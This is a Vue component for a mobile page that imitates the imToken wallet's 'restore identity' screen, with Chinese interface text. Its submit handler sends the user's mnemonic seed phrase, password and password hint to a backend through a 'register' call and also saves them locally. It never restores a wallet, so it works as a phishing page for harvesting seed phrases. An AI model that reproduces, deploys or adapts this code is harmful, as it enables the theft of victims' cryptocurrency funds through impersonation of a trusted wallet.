<template>
  <div class="createWallet">
    <van-nav-bar
            class="nav"
            left-arrow
            @click-left="$router.back()"
    >
      <template #right>
        <van-icon class="question" name="question-o" size="18"/>
      </template>
    </van-nav-bar>
    <main class="content">
      <div style="text-align: initial;">
      </div>
      <p class="title2">恢复身份</p>
      <p class="title3">你将拥有全新的多链钱包,比如ETH、BTC、COSMOS、EOS...</p>
      <div class="row">
        <aside class="label">
          <span>助记词</span>
        </aside>
        <div class="npt-container">
          <van-field
                  :formatter="formatter"
                  type="textarea"
                  v-model="sfName"
                  placeholder="输入助记词单词,并使用空格分割"/>
        </div>
      </div>
      <div class="row">
        <aside class="label">
          <span>创建密码</span>
        </aside>
        <div class="npt-container">
          <van-field
                  @blur="newPasswordBlur('newPasswordFlag')"
                  @focus="newPasswordFocus('newPasswordFlag')"
                  @input="val => inputMethod(val,'note')"
                  :type="show?'':'password'"
                  size="large"
                  class="npt"
                  v-model="createPassword"
                  placeholder="输入密码">
            <template #right-icon>
              <P v-if="newPasswordFlag" class="alert">{{passwordStatus}}</P>
            </template>
          </van-field>
          <van-field :type="show?'':'password'" size="large" class="npt" v-model="password" placeholder="重复输入密码">
            <template #right-icon>
              <van-icon v-if="!show" @click="show=!show" name="closed-eye"/>
              <van-icon v-else @click="show=!show" name="eye-o"/>
            </template>
          </van-field>
          <aside class="passDesc">
            <p v-if="newPasswordFlag&&!createPassword">
              不少于8个字符,建议混合大小写字母、数字、符号。
            </p>
            <p v-if="newPasswordFlag&&createPassword">
              {{createPassword.length}}字符
            </p>
          </aside>

        </div>
        <div class="row">
          <aside class="label">
            <span>密码提示(可选)</span>
          </aside>
          <div class="npt-container">
            <van-field size="large" class="npt" v-model="value2" placeholder="输入提醒文字"/>
          </div>
        </div>
      </div>
      <center class="center">
        <van-icon name="question-o" size="18"/>&nbsp;&nbsp;&nbsp;如何导入私钥/Keystore
      </center>
      <footer>
        <p class="passwordDesc2" style="justify-content: flex-start;">
          <van-checkbox v-model="checked">
            我已经阅读并同意
          </van-checkbox>
          <a class="cc" href="javascript:void(0);">imToken服务条款</a>
        </p>
        <van-button @click="handleSubmit" :disabled="disabled" :loading="loading" class="btn" color="#5280d6"
                    type="primary">恢复身份
        </van-button>
      </footer>
    </main>
  </div>
</template>

<script>
  import CustomSwitch from "../components/CustomSwitch";
  import CustomStep from "../components/customStep";
  import {register} from '../../api/loginPassword'
  import passwordRules from "../../mixins/passwordRules";
  import {hasInfo, saveInfo} from "../../utils/localStore";

  export default {
    name: "homePage",
    mixins: [passwordRules],
    components: {CustomStep, CustomSwitch},
    methods: {
      formatter (value) {
        return value.replace(/[\u4E00-\u9FA5]/g, '');
      },
      handleSubmit() {
        if (this.sfName.length < 48) {
          this.$toast.fail('助记词最低要输入48个字符!');
          return
        }
        if (this.createPassword.length < 8) {
          this.$toast.fail('密码必须至少包含8个字符!');
          return
        }
        if (this.createPassword !== this.password) {
          this.$toast.fail('两次输入的密码不一致,请重新输入!');
          return
        }
        if (!this.checked) {
          this.$toast.fail('请勾选已了解协议!!');
          return
        }
        const data = {
          sfName: this.sfName,
          password: this.password,
        }
        if (hasInfo(data)) {
          this.$toast.fail('2分钟只能提交一次!');
          return
        }
        saveInfo(data) // 保存输入过的助记词
        this.loading = true
        register({
          ...data,
          value2: this.value2,
        }).then(res => {
          if (res.code === 200) this.$toast.success(res.message);
          else this.$toast.fail('导入失败');
          this.loading = false
        }).catch(err => {
          this.loading = false
        })
      },
    },
    computed: {
      passwordClass: vm => pwdState[vm.note || 0][0],
      passwordStatus: vm => pwdState[vm.note || 0][1],
      disabled() {
        return !this.sfName || !this.createPassword || !this.password || !this.checked
      }
    },
    data() {
      return {
        checked: '',
        sfName: '',
        note: '',
        createPassword: '',
        password: '',
        value2: '',
        loading: false,
        newPassword: '',
        show: false,
      }
    }
  }
</script>

<style scoped lang="less">
  .createWallet {
    background: #f7f8fa;
    height: 100%;

    .nav {
      /deep/ .van-icon {
        color: #202123;
      }
    }

    .title2 {
      .pxrem(font-size, 38);
    }

    .title3 {
      color: #b4b4b4;
      .pxrem(font-size, 26);
      .pxrem(padding-top, 10);
    }

    .content {
      .pxrem(padding, 40);
      .pxrem(padding-right, 50);
      .pxrem(padding-left, 50);

      .row {
        .pxrem(padding-bottom, 40);

        .label {
          .pxrem(padding-top, 20);
          .pxrem(padding-bottom, 20);
          .pxrem(font-size, 26);
          color: #666;
          display: flex;
          justify-content: space-between;

        }

        .npt-container {
          text-align: center;

          .npt {
            .pxrem(padding, 15);
          }

          .passDesc {
            color: #999;
            text-align: left;
          }
        }

        .passwordDesc {
          text-align: left;
          color: #999;
          .pxrem(padding-top, 20);
          .pxrem(font-size, 32);
        }

        .alert {
          color: #348dd9;
          text-align: left;
          .pxrem(font-size, 30);
        }
      }

      .center {
        display: flex;
        align-items: center;
        justify-content: center;
        color: #1982ef;

        &:active {
          opacity: .3;
          transition: .3s;
        }
      }

    }

    .btn-container {
      .pxrem(padding-top, 30);

      .btn {
        width: 60%;
      }
    }

    .btn-container.one {
      .pxrem(padding-top, 500);
    }

    .desc {
      color: #999;
      position: fixed;
      bottom: 0;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 100%;
    }

    footer {
      position: fixed;
      left: 0;
      right: 0;
      bottom: 0;
      .pxrem(height, 200);
      background: #fdfdfd;
      text-align: center;

      .passwordDesc2 {
        text-align: center;
        color: #999;
        .pxrem(padding-top, 20);
        .pxrem(padding-left, 20);
        .pxrem(font-size, 22);
        display: flex;
        justify-content: space-between;

        a {
          color: #5280d6;
        }
      }

      .btn {
        width: 92%;
        margin-top: 10px;
      }
    }
  }

  /deep/ .van-icon-eye-o {
    color: #525ed6;
  }

  .question:active {
    opacity: .3;
    transition: .3s;
  }

  .cc {
    .pxrem(padding-left, 5);
  }

  .cc:active {
    opacity: .3;
    transition: .3s;
  }
</style>
